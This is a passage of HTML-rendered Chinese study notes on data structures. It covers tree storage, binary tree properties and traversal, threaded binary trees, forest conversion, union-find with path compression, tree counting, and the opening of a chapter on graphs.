punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604120808335-1717772719923-25.png" class="" alt="image-20240604120808335" loading="lazy"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">;</span>    <span class="token keyword">int</span> degree<span class="token punctuation">;</span>    node<span class="token operator">*</span> child<span class="token punctuation">[</span>degree<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604120827302.png" class="" alt="image-20240604120827302" loading="lazy"></li><li><p>孩子兄弟表示法/二叉树表示法/二叉链表</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">;</span>    node <span class="token operator">*</span> firstchild<span class="token punctuation">,</span><span class="token operator">*</span>rightsib<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604121143292.png" class="" alt="image-20240604121143292" loading="lazy"></li><li><p>孩子链表表示法/单链表表示法</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604121535027.png" class="" alt="image-20240604121535027" loading="lazy"></li><li><p>带双亲的孩子链表表示法</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604121554734.png" class="" alt="image-20240604121554734" loading="lazy"></li></ul><h3 id="二叉树"><a class="markdownIt-Anchor" href="#二叉树"></a> 二叉树</h3><ul><li><p>定义：二叉树中不存在度大于2的节点</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604115417686.png" class="" alt="image-20240604115417686" loading="lazy"></li><li><p>性质</p><ul><li><p>二叉树的第i(i&gt;=1)层最多有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">2^{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.824664em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>个节点</p></li><li><p>深度为k的二叉树最多有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>k</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^k-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.932438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个节点</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mn>0</mn><mo>=</mo><mi>n</mi><mn>2</mn><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n0=n2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></li><li><p>满二叉树</p><p>定义是：深度为k且有2<sup>k</sup>-1个节点的二叉树</p><ul><li>n个节点的的深度=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">log_2{(n+1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>(n&lt;=2<sup>k</sup>-1)</li><li>顺序编号的满二叉树，设编号分别为1,2，…n<ul><li>节点i的左小孩是2i</li><li>节点i的右小孩是2i+1</li><li>节点i的双亲是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>i</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor i/2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal">i</span><span class="mord">/</span><span class="mord">2</span><span class="mclose">⌋</span></span></span></span></li><li>节点i的层号=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>i</mi><mo stretchy="false">⌋</mo><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor log_2{i} \rfloor+1=\lfloor log_2{(i+1)} \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">i</span></span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mclose">⌋</span></span></span></span></li></ul></li></ul></li><li><p>完全二叉树</p><p>定义是深度为k的有n个节点的二叉树，当且仅当每一个节点都与同深度的满二叉树中编号从1到n的节点一一对应，也称顺序二叉树</p></li></ul></li><li><p>存储结构</p><ul><li><p>顺序存储</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> TElemType SqBiTree<span class="token punctuation">[</span>MAX_TREE_SIZE<span class="token punctuation">]</span>SqBiTree bt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604122921547.png" class="" alt="image-20240604122921547" loading="lazy"></li><li><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604123012037.png" class="" alt="image-20240604123012037" loading="lazy"></li><li><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604123022081.png" class="" alt="image-20240604123022081" loading="lazy"></li><li><p>链式存储结构</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604123131608.png" class="" alt="image-20240604123131608" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604123137771.png" class="" alt="image-20240604123137771" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604123143771.png" class="" alt="image-20240604123143771" loading="lazy"></li></ul></li></ul><h3 id="遍历二叉树和线索树"><a class="markdownIt-Anchor" href="#遍历二叉树和线索树"></a> 遍历二叉树和线索树</h3><h4 id="遍历"><a class="markdownIt-Anchor" href="#遍历"></a> 遍历</h4><ul><li><p>设D:访问根节点，输出根节点;L递归遍历左二叉树，R递归遍历右二叉树</p><p>DLR-先序遍历 DRL-逆先序遍历</p><p>LDR-中序遍历 RDL-逆中序遍历</p><p>LRD-后序遍历 RLD-逆后序遍历</p></li><li><p>先中后序遍历的非递归版本？</p><p>中序遍历非递归算法的思想：<mark>核心是回溯法，利用栈的数据结构</mark></p><p>(1)设置一个栈S存放所经过的根结点(指针)信息;初始化S;<br />(2)第一次访问到根结点并不访问，而是入栈:<br />(3)中序遍历它的左子树，左子树遍历结束后，第二次遇到根结点，就将根结点(指针)退栈，并且访问根结点;然后(中序)遍历它的右子树。<br />(4)当需要退栈时，如果栈为空则结束</p></li><li><p>时间复杂度:O(n)</p></li><li><p>空间复杂度:O(logn)</p></li><li><p>层次遍历</p><p>从上到下从左到右依次遍历节点</p><p>算法</p><p>(1)设置一个队列Q存放所经过的结点的非空的左右孩子(指针)信息;初始化Q;<br />(2)访问根结点，将非空的左右孩子依次入队;<br />(3)依次出队结点指针，访问该结点，将非空的左右孩子依次入队</p><p>(4)当队列为空时，遍历结束。</p></li><li><p><mark>由遍历序列构造二叉树</mark></p><ul><li><p>代码实现:</p></li><li><p><strong>由二叉树的先序序列和中序序列可以唯一地确定一棵二叉树。</strong><br />在先序遍历序列中,第一个结点一定是二叉树的根结点;而在中序遍历中,根结点必然将中序序列分割成两个子序列,前一个子序列是根结点的左子树的中序序列,后一个子序列是根结点的右子树的中序序列。根据这两个子序列,在先序序列中找到对应的左子序列和右子序列。在先序序列中,左子序列的第一个结点是左子树的根结点,右子序列的第一个结点是右子树的根结点。<br />如此递归地进行下去,便能唯一地确定这棵二叉树</p></li><li><p><strong>同理,由二叉树的后序序列和中序序列也可以唯一地确定一棵二叉树。</strong><br />因为后序序列的最后一个结点就如同先序序列的第一个结点,可以将中序序列分割成两个子序列,然后采用类似的方法递归地进行划分,进而得到一棵二叉树。<br />由二叉树的层序序列和中序序列也可以唯一地确定一棵二叉树。</p></li><li><p><strong>要注意的是,若只知道二叉树的先序序列和后序序列,则无法唯一确定一棵二叉树。</strong><br />例如,求先序序列( ABCDEFGH)和中序序列( BCAEDGHFI）所确定的二叉树<br />首先,由先序序列可知A为二叉树的根结点。中序序列中A之前的BC为左子树的中序序列,EDGHFI为右子树的中序序列。然后由先序序列可知B是左子树的根结点,D是右子树的根结点。以此类推,就能将剩下的结点继续分解下去,最后得到的二叉树如图©所示。</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604130058324.png" class="" alt="image-20240604130058324" loading="lazy"><p>给定后序序列:BGHECAJIFD  中序序列:BACGEHDIJF</p></li></ul></li></ul><h4 id="线索二叉树"><a class="markdownIt-Anchor" href="#线索二叉树"></a> 线索二叉树</h4><p><mark>线索二叉树是为了方便寻找线性序列（遍历二叉树得到的）的直接前驱和直接后继</mark></p><p>当<mark>以二叉链表作为存储结构</mark>，直接前驱和直接后续这种信息只能在遍历的动态过程中才能得到</p><p>如何存储前驱后继这种信息？</p><ul><li><p>在节点增加指针域，fwd和bkwd，不过这样太浪费空间了</p></li><li><p>我们知道，有n个节点的二叉链表必有2n个链域，由树的性质m=n-1，一条边占用一个链域，那么还剩下n+1个空链域</p><p>因此<mark>利用空链域存放指针指向树中其他节点，这种指针称为线索</mark></p></li><li><p>为了避免孩子和线索混淆，我们需要增加两个标志域</p><p><code>lchild | LTag | data | RTag | rchild</code></p><p>LTag=0，代表lchild域指向节点的左孩子，LTag=1代表指向节点的前驱</p><p>RTag=0, 代表rchild域指向节点的右孩子，RTag=1代表指向节点的后继</p></li><li><p>先中后序线索二叉树的手动构造,根据遍历序列建立线索</p></li><li><p>中序线索二叉树的构造</p><p><strong>二叉树的线索化是将二叉链表中的空指针改为指向前驱或后继的线索</strong>。而前驱或后继的信息只有在遍历时才能得到，因此<strong>线索化的实质就是遍历一次二叉树</strong>。<br />以中序线索二叉树的建立为例。附设指针 pre 指向刚刚访问过的结点，指针p 指向正在访问的结点，即pre指向p 的前驱。在中序遍历的过程中，<mark><strong>检查p的左指针是否为空，若为空就将它指向pre;检查pre的右指针是否为空，若为空就将它指向p</strong></mark></p><p>前序，后续，中序构造过程类似的，不过要细细考虑pre=root的位置</p></li><li><p>中序线索二叉树的遍历</p><p>在线索树中进行遍历，只要先找到序列的第一个节点，然后依次找节点后继直到其后继为空为止==<strong>若其右标志为“1”，则右链为线索，指示其后继，否则遍历右子树中第一个访问的结点（右子树中最左下的结点）为其后继</strong>。==</p><p>可以看到时间复杂度虽然是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>然而常数因子更小，且无需栈的使用</p><p>应用：有中序线索二叉树，从根节点开始</p><p>1）遍历中序的第一个结点</p><ul><li>中序，LDR;</li><li>子树L中的LDR;</li><li>直至子树L中没有L孩子</li></ul><p>2)遍历中根节点的前驱节点</p><ul><li>中序,LDR;</li><li>根节点的前驱为 子树L中的最后一个节点</li><li>子树L中的右子树R，子树R中的右子树R</li><li>直至右子树R中无R孩子，L最右边的孩子即是根节点的前驱</li></ul><p>3)遍历中根节点的后继节点</p><ul><li>中序,LDR;</li><li>子树R中的LDR，子树L的第一个节点</li><li>子树R中最左边的孩子</li></ul></li><li><p>后序线索二叉树找后继</p><p>（1）若节点x是二叉树的根，则其后继为空</p><p>（2）若节点x是其双亲的右孩子，或是其双亲的左孩子且其双亲没有右子树,则其后继即为双亲节点</p><p>（3）若节点x是其双亲的左孩子，且其双亲有右子树，则其后继为双亲的右子树上按后序遍历的第一个节点</p></li><li><p>代码实现</p></li></ul><h3 id="森林"><a class="markdownIt-Anchor" href="#森林"></a> 森林</h3><h4 id="森林与二叉树的转换"><a class="markdownIt-Anchor" href="#森林与二叉树的转换"></a> 森林与二叉树的转换</h4><ul><li><p>树转为二叉树</p><ol><li>在兄弟之间加连线</li><li>保留根与最左孩之间的连线，删去与其他孩子之间的连线</li><li>以根为轴心顺时针方向旋转45度</li></ol></li><li><p>森林转为二叉树</p><ol><li>将每个树转为二叉树</li><li>将每棵树的根节点相连成为一棵二叉树</li></ol></li><li><p>二叉树转为树</p><p>上述的逆过程</p><ol><li><strong>去掉右子指针</strong>：将所有右子节点都变成当前节点的兄弟节点。</li><li><strong>左子指针转子节点指针</strong>：保持左子指针，即左子指针依然指向它最主要的子节点。</li></ol><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604125601727.png" class="" alt="image-20240604125601727" loading="lazy"></li><li><p>二叉树转为森林</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604125610884.png" class="" alt="image-20240604125610884" loading="lazy"></li></ul><h3 id="并查集"><a class="markdownIt-Anchor" href="#并查集"></a> 并查集</h3><ul><li><p>定义：<br />并查集是一种树型的数据结构，用于处理一些不相交集合的合并及查询问题（即所谓的并、查）。比如说，我们可以用并查集来判断一个森林中有几棵树、某个节点是否属于某棵树等。</p><p><mark>实现为一个森林，其中每棵树表示一个集合，树中的节点表示对应集合中的元素。</mark></p></li><li><p>操作</p><ul><li>合并（union)，合并两个元素所属集合,即合并对应的树<ul><li>只需要把一棵树的根节点连到另一棵树的根节点</li></ul></li><li>查询(find),查询某个元素所属集合<ul><li>沿着树向上移动，直至找到根节点</li></ul></li></ul></li><li><p>优化</p><ul><li><p>路径压缩（优化find函数）</p><p><mark>简单说来就是将x到根节点路径上的所有点的pre（上级）都设为根节点</mark></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>     <span class="token comment">//查找结点 x的根结点 </span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> x<span class="token punctuation">)</span> <span class="token keyword">return</span> x<span class="token punctuation">;</span><span class="token comment">//递归出口：x的上级为 x本身，即 x为根结点        </span>    <span class="token keyword">return</span> pre<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此代码相当于先找到根结点 rootx，然后pre[x]=rootx </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺点：只有当查找了根节点后，才能对该查找路径上的各节点进行路径压缩。</p></li><li><p>加权标记法</p><p>加权标记法需要将树中所有节点都增设一个权值，用以表示该节点所在树中的高度（比如用rank[x]=3表示 x 节点所在树的高度为3）。这样一来，在合并操作的时候就能通过这个权值的大小来决定谁当谁的上级</p><p>加权标记法的核心在于对rank数组的逻辑控制，其主要的情况有：<br />1、如果rank[x] &lt; rank[y]，则令pre[x] = y；<br />2、如果rank[x] == rank[y]，则可任意指定上级；<br />3、如果rank[x] &gt; rank[y]，则令pre[y] = x；</p></li></ul></li><li><p>作用：<br />并查集的主要作用是求连通分支数（如果一个图中所有点都存在可达关系（直接或间接相连），则此图的连通分支数为1；如果此图有两大子图各自全部可达，则此图的连通分支数为2……）</p></li></ul><h3 id="树的应用"><a class="markdownIt-Anchor" href="#树的应用"></a> 树的应用</h3><p><mark>一个递归的过程，往往可以看做一个树形结构的状态树</mark></p><p>几种问题的应用(回溯法，树形状态图，递归设计)</p><ul><li>求含n个元素的幂集</li><li>n皇后问题</li><li>骑士游历</li><li>迷宫问题</li><li>选最优解问题</li></ul><h3 id="哈夫曼树"><a class="markdownIt-Anchor" href="#哈夫曼树"></a> 哈夫曼树</h3><p>写报告的时候看吐了就不写了</p><h3 id="树的计数"><a class="markdownIt-Anchor" href="#树的计数"></a> 树的计数</h3><p>推导过程课本P152，太长了不想看</p><ul><li><p>二叉树：</p><p>具有n个节点不同形态的二叉树有多少棵</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>n</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></mfrac><msubsup><mi>C</mi><mrow><mn>2</mn><mi>n</mi></mrow><mi>n</mi></msubsup></mrow><annotation encoding="application/x-tex">bn=\frac{1}{n+1}C_{2n}^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2484389999999999em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>由二叉树的计数可以推得树的计数</p><p>具有n个节点不同形态的树<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">t_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和具有n-1个节点不同形态的二叉树一样</p><p>即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>n</mi></msub><mo>=</mo><msub><mi>b</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">t_n=b_{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span></p></li></ul><h2 id="chap7-图"><a class="markdownIt-Anchor" href="#chap7-图"></a> Chap7 图</h2><h3 id="图的定义和术语"><a class="markdownIt-Anchor" href="#图的定义和术语"></a> 图的定义和术语</h3><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604162300554.png" class="" alt="image-20240604162300554" loading="lazy"><ul><li><p>术语</p><p>有向图，无向图</p><p><strong>完全图</strong>:有n个节点和(n-1)*n/2条边</p><p>有向完全图，网：边上加权的图，入度，出度，度，连通图以及连通分量:极大连通子图</p><p>强连通图(每对顶点vi-vj，vj-vi都有路径)与强连通分量:极大强连通子图</p><p>生成树：极小连通子图</p></li></ul><h3 id="图的存储结构"><a class="markdownIt-Anchor" href="#图的存储结构"></a> 图的存储结构</h3><h4 id="数组表示法邻接矩阵顺序"><a class="markdownIt-Anchor" href="#数组表示法邻接矩阵顺序"></a> 数组表示法/邻接矩阵(顺序)</h4><img 